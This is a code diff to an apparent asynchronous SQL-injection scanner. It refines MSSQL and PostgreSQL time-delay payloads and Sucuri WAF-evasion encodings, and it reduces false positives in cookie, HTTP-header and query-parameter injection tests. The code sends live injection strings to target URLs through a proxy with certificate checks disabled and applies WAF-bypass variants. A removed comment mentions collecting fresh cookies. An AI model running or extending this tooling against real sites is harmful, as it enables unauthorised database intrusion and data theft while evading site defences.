@@ -207,7 +207,7 @@ class SQLiScanner:
         ],
         "mssql": [
             "'; WAITFOR DELAY '0:0:{delay}'-- -",
-            "' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))x)-- -",
+            "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
         ],
         "postgresql": [
             "'; SELECT pg_sleep({delay})-- -",
@@ -303,7 +303,7 @@ class SQLiScanner:
         "Sucuri": {
             "encodings": [
                 lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SE%0BLECT"),
-                lambda p: p.replace("'", "%27%27")[:-3],
+                lambda p: p.replace("'", "%27"),  # URL-encode single quotes
                 lambda p: p.replace(" ", chr(0x0a)),
             ],
             "techniques": ["time", "error"],
@@ -560,7 +560,7 @@ class SQLiScanner:
         """Inject SQLi payloads into cookie values to find vulnerabilities.
         
         Tests each cookie by injecting payloads and checking for DBMS errors.
-        Also extracts fresh cookies for b3 collection.
+        Fetches a baseline first to filter pre-existing error strings.
         """
         results = []
         
@@ -568,6 +568,10 @@ class SQLiScanner:
         jar = await self.extract_cookies(url, session)
         if not jar.cookies:
             return results
+        
+        # Baseline: fetch page with normal cookies to detect pre-existing errors
+        baseline_body, _ = await self._fetch(url, session)
+        baseline_dbms = self._detect_dbms(baseline_body) if baseline_body else None
         
         injection_payloads = [
             "'",
@@ -607,6 +611,9 @@ class SQLiScanner:
                     
                     dbms = self._detect_dbms(body)
                     if dbms:
+                        # Skip if same DBMS error was already in baseline
+                        if baseline_dbms == dbms:
+                            continue
                         extracted = self._extract_error_data(body)
                         result = SQLiResult(
                             url=url,
@@ -641,8 +648,14 @@ class SQLiScanner:
         
         Tests X-Forwarded-For, Referer, and other headers that
         backend apps sometimes log/query without sanitization.
+        Fetches baseline first to filter pre-existing errors.
         """
         results = []
+        
+        # Baseline: detect pre-existing errors
+        baseline_body, baseline_time = await self._fetch(url, session)
+        baseline_dbms = self._detect_dbms(baseline_body) if baseline_body else None
+        baseline_time = baseline_time if baseline_time >= 0 else 2.0  # Conservative fallback
         
         injection_payloads = [
             "' OR '1'='1",
@@ -654,58 +667,66 @@ class SQLiScanner:
         for header_name in self.INJECTABLE_HEADERS:
             for payload in injection_payloads:
                 try:
-                    test_payload = payload
+                    # Build list of payload variants (original + WAF bypass versions)
                     if waf_name:
-                        bypasses = self._apply_waf_bypass(payload, waf_name)
-                        test_payload = bypasses[0]
+                        payload_variants = self._apply_waf_bypass(payload, waf_name)[:3]  # Cap at 3 to limit requests
+                    else:
+                        payload_variants = [payload]
                     
-                    headers = {
-                        "User-Agent": self.user_agent,
-                        header_name: test_payload,
-                    }
-                    
-                    start_t = time.time()
-                    async with self.semaphore:
-                        async with session.get(url, headers=headers, allow_redirects=True,
-                                               ssl=False, proxy=self.proxy) as resp:
-                            body = await resp.text(errors="ignore")
-                            elapsed = time.time() - start_t
-                    
-                    # Check for error-based detection
-                    dbms = self._detect_dbms(body)
-                    if dbms:
-                        result = SQLiResult(
-                            url=url,
-                            parameter=f"Header:{header_name}",
-                            vulnerable=True,
-                            injection_type="header",
-                            dbms=dbms,
-                            technique=f"Header injection ({header_name})",
-                            payload_used=test_payload,
-                            confidence=0.80,
-                            injection_point="header",
-                        )
-                        logger.info(f"Header injection SQLi! {url} header={header_name} dbms={dbms}")
-                        results.append(result)
-                        break
-                    
-                    # Check for time-based detection
-                    if "WAITFOR" in payload or "SLEEP" in payload:
-                        if elapsed >= 2.5:
+                    found_in_header = False
+                    for test_payload in payload_variants:
+                        headers = {
+                            "User-Agent": self.user_agent,
+                            header_name: test_payload,
+                        }
+                        
+                        start_t = time.time()
+                        async with self.semaphore:
+                            async with session.get(url, headers=headers, allow_redirects=True,
+                                                   ssl=False, proxy=self.proxy) as resp:
+                                body = await resp.text(errors="ignore")
+                                elapsed = time.time() - start_t
+                        
+                        # Check for error-based detection
+                        dbms = self._detect_dbms(body)
+                        if dbms and dbms != baseline_dbms:  # Exclude pre-existing errors
                             result = SQLiResult(
                                 url=url,
                                 parameter=f"Header:{header_name}",
                                 vulnerable=True,
                                 injection_type="header",
-                                dbms="mssql" if "WAITFOR" in payload else "mysql",
-                                technique=f"Time-based header injection ({header_name})",
+                                dbms=dbms,
+                                technique=f"Header injection ({header_name})",
                                 payload_used=test_payload,
-                                confidence=0.70,
+                                confidence=0.80,
                                 injection_point="header",
                             )
-                            logger.info(f"Time-based header injection! {url} header={header_name}")
+                            logger.info(f"Header injection SQLi! {url} header={header_name} dbms={dbms}")
                             results.append(result)
+                            found_in_header = True
                             break
+                        
+                        # Check for time-based detection
+                        if "WAITFOR" in payload or "SLEEP" in payload:
+                            if elapsed >= 2.5 and elapsed > baseline_time + 1.5:
+                                result = SQLiResult(
+                                    url=url,
+                                    parameter=f"Header:{header_name}",
+                                    vulnerable=True,
+                                    injection_type="header",
+                                    dbms="mssql" if "WAITFOR" in payload else "mysql",
+                                    technique=f"Time-based header injection ({header_name})",
+                                    payload_used=test_payload,
+                                    confidence=0.70,
+                                    injection_point="header",
+                                )
+                                logger.info(f"Time-based header injection! {url} header={header_name}")
+                                results.append(result)
+                                found_in_header = True
+                                break
+                    
+                    if found_in_header:
+                        break  # Move to next header
                         
                 except Exception as e:
                     logger.debug(f"Header injection error: {e}")
@@ -830,7 +851,11 @@ class SQLiScanner:
         return results
 
     async def _fetch(self, url: str, session: aiohttp.ClientSession) -> Tuple[str, float]:
-        """Fetch a URL and return (body, response_time)."""
+        """Fetch a URL and return (body, response_time).
+        
+        Returns elapsed=-1.0 on timeout (sentinel — NOT a real timing value).
+        Callers must check for elapsed < 0 before using timing comparisons.
+        """
         try:
             async with self.semaphore:
                 start = time.time()
@@ -839,10 +864,10 @@ class SQLiScanner:
                     elapsed = time.time() - start
                     return body, elapsed
         except asyncio.TimeoutError:
-            return "", self.timeout
+            return "", -1.0  # Sentinel: timeout is NOT time-based SQLi evidence
         except Exception as e:
             logger.debug(f"Fetch error for {url}: {e}")
-            return "", 0
+            return "", -1.0  # Sentinel: network error also not usable for timing
 
     def _detect_dbms(self, body: str) -> Optional[str]:
         """Detect DBMS from error messages in response body."""
@@ -878,8 +903,18 @@ class SQLiScanner:
         
         return data
 
-    async def test_heuristic(self, url: str, session: aiohttp.ClientSession) -> Tuple[bool, Optional[str], str]:
+    async def test_heuristic(self, url: str, session: aiohttp.ClientSession,
+                              target_param: str = None) -> Tuple[bool, Optional[str], str]:
         """Quick heuristic test to check if parameter is injectable.
+        
+        Fetches a baseline response first — if the page already contains
+        DBMS error strings, those matches are excluded to avoid false positives.
+        
+        Args:
+            url: Target URL with query parameters
+            session: aiohttp session
+            target_param: If set, only test this parameter (avoids redundant work when
+                          the caller is already iterating over params).
         
         Returns:
             (is_injectable, dbms, parameter_name)
@@ -888,7 +923,13 @@ class SQLiScanner:
         if not params:
             return False, None, ""
         
-        for param_name in params:
+        # Fetch baseline response to check for pre-existing SQL error strings
+        baseline_body, _ = await self._fetch(url, session)
+        baseline_dbms = self._detect_dbms(baseline_body) if baseline_body else None
+        
+        params_to_test = [target_param] if target_param and target_param in params else list(params.keys())
+        
+        for param_name in params_to_test:
             # Test each parameter
             for payload in self.HEURISTIC_PAYLOADS[:4]:  # Quick test with first 4
                 test_params = params.copy()
@@ -902,6 +943,11 @@ class SQLiScanner:
                 
                 dbms = self._detect_dbms(body)
                 if dbms:
+                    # If the same DBMS error already appears in baseline, it's a false positive
+                    if baseline_dbms == dbms:
+                        logger.debug(f"Heuristic skip: {url} param={param_name} — "
+                                     f"DBMS error '{dbms}' already in baseline response")
+                        continue
                     logger.info(f"Heuristic hit: {url} param={param_name} dbms={dbms}")
                     return True, dbms, param_name
         
@@ -1195,14 +1241,25 @@ class SQLiScanner:
                                session: aiohttp.ClientSession) -> Optional[SQLiResult]:
         """Test time-based blind SQL injection.
         
+        Uses a multi-round approach:
+          1. Measure baseline response time (clean URL)
+          2. Inject SLEEP/WAITFOR payload, measure response time
+          3. Confirm: re-test same payload to reduce false positives
+          4. Verify: test with delay=0 to ensure normal speed returns
+        
         Returns:
             SQLiResult if vulnerable, None otherwise
         """
         base, params = self._parse_url(url)
         delay = self.delay
         
-        # Get baseline response time
-        _, baseline_time = await self._fetch(url, session)
+        # Get baseline response time (average of 2 to reduce noise)
+        _, baseline_time1 = await self._fetch(url, session)
+        _, baseline_time2 = await self._fetch(url, session)
+        if baseline_time1 < 0 and baseline_time2 < 0:
+            return None  # Can't even reach the URL
+        valid_baselines = [t for t in (baseline_time1, baseline_time2) if t >= 0]
+        baseline_time = sum(valid_baselines) / len(valid_baselines) if valid_baselines else 0
         
         for dbms, payloads in self.TIME_PAYLOADS.items():
             for payload_template in payloads[:2]:  # Test first 2 per DBMS
@@ -1215,11 +1272,29 @@ class SQLiScanner:
                 
                 _, elapsed = await self._fetch(test_url, session)
                 
-                # If response took significantly longer than baseline + delay threshold
+                # Skip if timeout sentinel — a network timeout is NOT evidence of SLEEP
+                if elapsed < 0:
+                    continue
+                
+                # Response must be notably slower than baseline
                 if elapsed >= delay * 0.8 and elapsed > baseline_time + (delay * 0.5):
                     # Confirm with a second test
                     _, elapsed2 = await self._fetch(test_url, session)
+                    if elapsed2 < 0:
+                        continue  # Timeout sentinel — skip
                     if elapsed2 >= delay * 0.7:
+                        # Verification: test with delay=0 — should be fast
+                        zero_payload = payload_template.format(delay=0)
+                        zero_params = params.copy()
+                        zero_params[param_name] = [str(original) + zero_payload]
+                        zero_url = self._build_url(base, zero_params)
+                        _, zero_elapsed = await self._fetch(zero_url, session)
+                        
+                        # If the zero-delay request is ALSO slow, the site is just slow
+                        if zero_elapsed >= 0 and zero_elapsed >= delay * 0.5:
+                            logger.debug(f"Time-based FP filter: delay=0 still took {zero_elapsed:.1f}s for {url}")
+                            continue
+                        
                         result = SQLiResult(
                             url=url,
                             parameter=param_name,
@@ -1228,9 +1303,10 @@ class SQLiScanner:
                             dbms=dbms,
                             technique=f"Time-based blind ({delay}s delay)",
                             payload_used=payload,
-                            confidence=0.75,
+                            confidence=0.80,
                         )
-                        logger.info(f"Time-based SQLi found: {url} param={param_name} dbms={dbms}")
+                        logger.info(f"Time-based SQLi found: {url} param={param_name} dbms={dbms} "
+                                    f"baseline={baseline_time:.1f}s injected={elapsed:.1f}s+{elapsed2:.1f}s")
                         return result
         
         return None
@@ -1352,8 +1428,8 @@ class SQLiScanner:
                 for param_name in ordered_params:
                     logger.info(f"Testing parameter '{param_name}' in {url}")
                     
-                    # Heuristic check
-                    injectable, dbms, _ = await self.test_heuristic(url, session)
+                    # Heuristic check — test only this specific parameter
+                    injectable, dbms, _ = await self.test_heuristic(url, session, target_param=param_name)
                     if not injectable:
                         continue
                     
